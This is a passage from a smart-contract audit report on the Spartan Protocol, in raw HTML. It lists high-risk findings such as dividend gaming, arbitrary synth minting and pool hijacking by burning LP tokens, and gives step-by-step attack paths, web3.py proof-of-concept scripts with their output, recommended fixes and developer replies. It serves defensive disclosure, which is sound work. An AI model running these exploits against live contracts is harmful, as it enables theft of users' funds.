reserve is high, the attack can be profitable:</p>\n<ol>\n<li>Manipulate the pool spot price of the <code>iSYNTH(_synth).LayerONE()</code> pool by dripping a lot of <code>BASE</code> into it repeatedly (sending lots of smaller trades is less costly due to the <a href=\"https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools\">path-independence of the continuous liquidity model</a>). This increases the <code>BASE</code> per <code>token</code> price.</li>\n<li>Call <code>SynthVault.depositForMember</code> and deposit a <em>small</em> amount of synth token. The <code>iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)</code> will return an inflated weight due to the price.</li>\n<li>Optionally drip more <code>BASE</code> into the pool and repeat the deposits</li>\n<li>Drip back <code>token</code> to the pool to rebalance it</li>\n</ol>\n<p>The user’s <code>weight</code> is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards. The cost of the attack depends on the pool’s liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.</p>\n<p>Recommend tracking a TWAP price of the synth instead, store the deposited synths instead, and compute the weight &#x26; total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/166#issuecomment-884641152\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>There is already a discussion in place to change spot rate to swap rate calculation for weights.</p>\n</blockquote>\n<h2 id=\"h-07-missing-slippage-checks\" style=\"position:relative;\"><a href=\"#h-07-missing-slippage-checks\" aria-label=\"h 07 missing slippage checks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/171\">[H-07] Missing slippage checks</a></h2>\n<p><em>Submitted by cmichel, also found by tensors</em></p>\n<p>There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated.\nThis means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%. See issue page for referenced code.</p>\n<p>Recommend adding a minimum amount out parameter. The function reverts if the minimum amount isn’t obtained.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-884593067\">verifyfirst (Spartan) acknowledge:</a></strong></p>\n<blockquote>\n<p>We acknowledge the issue for the protocol’s AMM, but if this becomes a large issue in the future, the router is easily upgradeable to include a minimum rate parameter.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-889638485\">SamusEldburg (Spartan) confirmed and disagreed with severity:</a></strong></p>\n<blockquote>\n<p>Have changed this to confirmed; even though we already were aware of it; we have discussed and are happy to add in a UI-handed arg for minAmount now rather than reactively in the future. Disagree with severity though; this wasn’t a problem with V1 at all.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-894863717\">ghoul-sol (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’ll keep high risk as sandwich attacks are very common and risk of getting a bad swap is real.</p>\n</blockquote>\n<h2 id=\"h-08-dividend-reward-can-be-gamed\" style=\"position:relative;\"><a href=\"#h-08-dividend-reward-can-be-gamed\" aria-label=\"h 08 dividend reward can be gamed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/182\">[H-08] Dividend reward can be gamed</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p>The <code>Router.addDividend</code> function tells the reserve to send dividends to the pool depending on the fees.</p>\n<ul>\n<li>The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent.</li>\n<li>The <code>normalAverageFee</code> variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool <code>arrayFeeSize</code> (20) times (use <code>buyTo</code>). The fees of the single wei trades will be zero and thus the <code>normalAverageFee</code> will also be zero as, see <code>addTradeFee</code>.</li>\n<li>The attacker then does a trade that generates some non-zero fees, setting the <code>normalAverageFee</code> to this trade’s fee. The <code>feeDividend</code> is then computed as <code>_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2</code>. Half of the <code>dailyAllocation</code> is sent to the pool.</li>\n<li>The attacker repeats the above steps until the reserve is almost empty. Each time the <code>dailyAllocation</code> gets smaller but it’s still possible to withdraw almost all of it.</li>\n<li>They redeem their LP tokens and gain a share of the profits</li>\n</ul>\n<p>The reserve can be emptied by the attacker.</p>\n<p>Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short.\nI think a better idea is to compute the dividends based on <strong>volume</strong> traded over a timespan instead of looking at individual trades.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-885412630\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Only very deep pools will be curated for dividends.\nVariables can be changed reactively to alter the dividends.\nWhilst we were aware of this and feel the attack is limited its sparked some discussion for some new ideas to solve this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-894864375\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Keeping high risk as the report is valid</p>\n</blockquote>\n<h2 id=\"h-09-arbitrary-synth-mintburn-from-pool\" style=\"position:relative;\"><a href=\"#h-09-arbitrary-synth-mintburn-from-pool\" aria-label=\"h 09 arbitrary synth mintburn from pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/20\">[H-09] arbitrary synth mint/burn from pool</a></h2>\n<p><em>Submitted by jonah1005</em></p>\n<p><code>Pool</code> can mint arbitrary <code>Synth</code> provided as long as it’s a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.</p>\n<p><a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242\">Pool’s mintSynth logic</a>, <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171\">Synth’s mintSynth logic</a>, and <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242\">Synth’s authorization logic</a>.</p>\n<p>The price of the synthetics to be mint is calculated in <code>Pool</code> based on the AMM price of the current Pool</p>\n<p>Here’s a web3.py script of minting arbitrary <code>Synth</code> in a pool.\nFor simplicity, two pools are set with the assumption that link is 10x expensive than dai.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">sparta_amount = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">initail_link_synth = link_synth.functions.balanceOf(user).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">base.functions.transfer(link_pool.address, sparta_amount).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">link_pool.functions.mintSynth(link_synth.address, user).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">after_link_synth = link_synth.functions.balanceOf(user).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;get link synth amount from link pool:&#39;</span><span class=\"mtk1\">, after_link_synth - initail_link_synth)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">sparta_amount = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">initail_link_synth = link_synth.functions.balanceOf(user).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">base.functions.transfer(dai_pool.address, sparta_amount).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">dai_pool.functions.mintSynth(link_synth.address, user).transact({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk1\">: user})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">after_link_synth = link_synth.functions.balanceOf(user).call()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;get link synth amount from dai pool:&#39;</span><span class=\"mtk1\">, after_link_synth - initail_link_synth)</span></span></span></code></pre>\n<p>The log of the above script</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">get</span><span class=\"mtk1\"> </span><span class=\"mtk12\">link</span><span class=\"mtk1\"> </span><span class=\"mtk12\">synth</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">link</span><span class=\"mtk1\"> pool: </span><span class=\"mtk7\">97078046905036524413</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">get</span><span class=\"mtk1\"> </span><span class=\"mtk12\">link</span><span class=\"mtk1\"> </span><span class=\"mtk12\">synth</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dai</span><span class=\"mtk1\"> pool: </span><span class=\"mtk7\">970780469050365244136</span></span></span></code></pre>\n<p>Recommend Checking the provided synth’s underlying token in <code>mintSynth</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iSYNTH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">synthOut</span><span class=\"mtk1\">).</span><span class=\"mtk11\">LayerONE</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">TOKEN</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid synth&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/20#issuecomment-883837548\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>We agree and appreciate this finding being valid high risk issue.</p>\n</blockquote>\n<h2 id=\"h-10-hijack-token-pool-by-burning-liquidity-token\" style=\"position:relative;\"><a href=\"#h-10-hijack-token-pool-by-burning-liquidity-token\" aria-label=\"h 10 hijack token pool by burning liquidity token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/38\">[H-10] Hijack token pool by burning liquidity token</a></h2>\n<p><em>Submitted by jonah1005</em></p>\n<p><code>Pool</code> allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools’ rate to a point that no one can get any lp token anymore (even if depositing token).</p>\n<p>The liquidity tokens are calculated at <code>Utils:calcLiquidityUnits</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// units = ((P (t B + T b))/(2 T B)) * slipAdjustment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// P * (part1 + part2) / (part3) * slipAdjustment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slipAdjustment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getSlipAdustment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">, </span><span class=\"mtk12\">B</span><span class=\"mtk1\">, </span><span class=\"mtk12\">t</span><span class=\"mtk1\">, </span><span class=\"mtk12\">T</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">part1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">t</span><span class=\"mtk1\">*(</span><span class=\"mtk12\">B</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">part2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">T</span><span class=\"mtk1\">*(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">part3</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">T</span><span class=\"mtk1\">*(</span><span class=\"mtk12\">B</span><span class=\"mtk1\">)*(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_units</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">P</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">part1</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">part2</span><span class=\"mtk1\">))) / (</span><span class=\"mtk12\">part3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_units</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">slipAdjustment</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">one</span><span class=\"mtk1\">;  </span><span class=\"mtk3\">// Divide by 10**18</span></span></span></code></pre>\n<p>where <code>P</code> stands for <code>totalSupply</code> of current Pool. If <code>P</code> is too small (e.g, 1) then all the units would be rounding to 0.</p>\n<p>Since any person can create a <code>Pool</code> at <code>PoolFactory</code>, hackers can create a Pool and burn his lp and set <code>totalSupply</code> to 1. He will be the only person who owns the Pool’s lp from now on. <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146\">Pool’s burn logic</a> and <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80\">Utils’ lp token formula</a>.</p>\n<p>Here’s a script of a user depositing 1M token to a pool where <code>totalSupply</code> equals 1</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">dai_pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">init_amount</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;total supply&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dai_pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">().</span><span class=\"mtk11\">call</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">dai</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dai_pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">dai_pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">print</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;lp received from depositing 1M dai: &#39;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dai_pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">call</span><span class=\"mtk1\">())</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">total</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lp</span><span class=\"mtk1\"> </span><span class=\"mtk12\">received</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositing</span><span class=\"mtk1\"> 1</span><span class=\"mtk12\">M</span><span class=\"mtk1\"> dai:  </span><span class=\"mtk7\">0</span></span></span></code></pre>\n<p>Recommend removing <code>burn</code> or restrict it to privileged users only.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/38#issuecomment-883855367\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>We agree to this issue and will restrict access to burn in the pool contract.\nWe have already proposed adding a 1 week withdraw coolOff for all users per pool from the genesis of creation. Users can only add liquidity within this period.</p>\n</blockquote>\n<h2 id=\"h-11-misuse-of-amm-model-on-minting-synth-resubmit-to-add-more-detail\" style=\"position:relative;\"><a href=\"#h-11-misuse-of-amm-model-on-minting-synth-resubmit-to-add-more-detail\" aria-label=\"h 11 misuse of amm model on minting synth resubmit to add more detail permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/59\">[H-11] Misuse of AMM model on minting <code>Synth</code> (resubmit to add more detail)</a></h2>\n<p><em>Submitted by jonah1005</em></p>\n<p><code>Pool</code> calculates the amount to be minted based on <code>token_amount</code> and <code>sparta_amount</code> of the Pool. However, since <code>token_amount</code> in the pool would not decrease when users mint <code>Synth</code>, it’s always cheaper to mint <code>synth</code> than swap the tokens.</p>\n<p>The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.</p>\n<p>In <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242\">Pool’s mint <code>synth</code></a>, The <code>synth</code> amount is calculated at L:232</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">output</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcSwapOutput</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_actualInputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which is the same as swapping base to token at L:287</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_X</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_Y</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_y</span><span class=\"mtk1\"> =  </span><span class=\"mtk11\">iUTILS</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">UTILS</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">calcSwapOutput</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_X</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_Y</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Calc TOKEN output</span></span></span></code></pre>\n<p>However, while swapping tokens decrease pool’s token, mint just mint it out of the air.</p>\n<p>Here’s a POC:\nSwap sparta to token for ten times</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> i </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk11\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    amount = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    transfer_amount = </span><span class=\"mtk10\">int</span><span class=\"mtk1\">(amount/</span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    base.functions.transfer(token_pool.address, transfer_amount).transact()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    token_pool.functions.swapTo(token.address, user).transact()</span></span></span></code></pre>\n<p>Mint <code>Synth</code> for ten times</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> i </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk11\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    amount = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    transfer_amount = </span><span class=\"mtk10\">int</span><span class=\"mtk1\">(amount/</span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    base.functions.transfer(token_pool.address, transfer_amount).transact()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    token_pool.functions.mintSynth(token_synth.address, user).transact()</span></span></span></code></pre>\n<p>The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets <code>4744.4059</code> and the second case gets <code>6223.758</code>.</p>\n<p>The debt should be considered in the AMM pool so I recommend to maintain a debt variable in the Pool and use <code>tokenAmount - debt</code> when the Pool calculates the token price. Here’s some idea of it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span 